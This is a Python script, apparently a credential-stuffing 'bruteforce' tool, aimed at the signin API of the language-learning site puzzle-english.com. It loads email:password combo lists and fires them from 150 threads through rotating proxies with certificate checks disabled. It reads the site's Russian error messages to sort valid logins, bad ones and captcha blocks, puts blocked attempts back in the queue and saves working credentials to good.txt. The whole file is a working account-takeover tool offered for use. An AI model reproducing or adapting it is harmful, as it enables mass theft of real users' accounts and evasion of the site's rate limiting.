import requests
import sys, os
import random
import datetime
import threading
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



class Brute(object):
    def __init__(self):
        self.projectName = "PuzzleEnglish"
        self.projectFullName = "PuzzleEnglish only bruteforce"
        self.description = "Author : Pirate2110"
        self.good = 0
        self.bad = 0 
        self.error = 0
        self.projerror = 0
        self.projid = 0
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.captcha = 0
        self.running = True
        self.timeout = 15
        self.thread_count = 150
        self.today = datetime.datetime.today()
        self.lines = []
        self.lock = threading.Lock()
        self.count_list = 0

    def check(self, login, password):
        try:
            if self.proxytype != "burp":
                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
            else:
                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Accept' : 'application/json, text/javascript, */*; q=0.01'}
            
            body = {'email' : login, 'password': password, 'cookie' : 'language_selected=ru;+tg_movies_gift_6month=12_months;+tg_limit_reached_checkout=old+popup;+tg_chatbot_onboarding=default_onboarding;+tg_landing_brochure_popup=100_phrases;+user_language=ru;+_ga=GA1.2.1852719316.1617157278;+_gid=GA1.2.1536426206.1617157278;+_ym_uid=1617157280411062512;+_ym_d=1617157280;+_ym_isad=1;+_fbp=fb.1.1617157279765.1795761115;+amp_fdb811=pkKpOultbMx8-qt8HkicgN...1f231bk2b.1f231bk2b.0.0.0;+__exponea_etc__=c94e1382-3092-4087-a46c-b38fbabdef0d;+__exponea_time2__=-0.006512165069580078;+_ym_visorc=w;+redirect_to_after_auth=%2F'}
            r = requests.post("https://puzzle-english.com/api2/user/signin?", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)

            #print(r.json()['message'])
            
            if "Слишком много попыток авторизации" in r.json()['message'] or "Введите проверочный код" in r.json()['message']:
                self.captcha += 1
                self.lines.append(login+':'+password)
            elif "Пользователь не существует" in r.json()['message'] or "Неверный пароль" in r.json()['message']:
                self.bad += 1
            elif r.json()['error'] == False:
                self.writelog("good.txt", login + ":" + password)
                self.good += 1
            else:
                self.projerror += 1
                self.writelog("projerr.txt", login + ":" + password + "|" + r.text)
        except Exception as e:
            #print("Error is " + str(e))
            self.error += 1
            self.lines.append(login+':'+password)
     
    def stop(self):
        self.running = False
        print("Work ended", end='\r')
        sys.stdout.flush()

   



    def mult(self):
        with open(self.basename, "r") as tags:
            for line in tags:
                #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                self.lines.append(line.strip())
            print('Count of accounts : ' + str(len(self.lines)))  
            self.count_list = len(self.lines) 
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.work)
            t.start()

    def work(self):
    #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
        while self.running:
            if (len(self.lines) == 0):
                self.stop()
                break

            self.lock.acquire()
            if self.projid == 0:
                print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
            sys.stdout.flush()
            trl = self.lines[0]
            self.lines.pop(0)
            self.lock.release()

            if ":" in trl:
                self.check(trl.split(':')[0], trl.split(':')[1])
            if ";" in trl:
                self.check(trl.split(';')[0], trl.split(';')[1])
            
            time.sleep(1)
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def getproxy(self):
        proxyfile = open(self.proxyname).read().splitlines()
        return random.choice(proxyfile)

    def writelog(self, file, log):
        dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'a') as the_file:
            the_file.write(log + '\n')
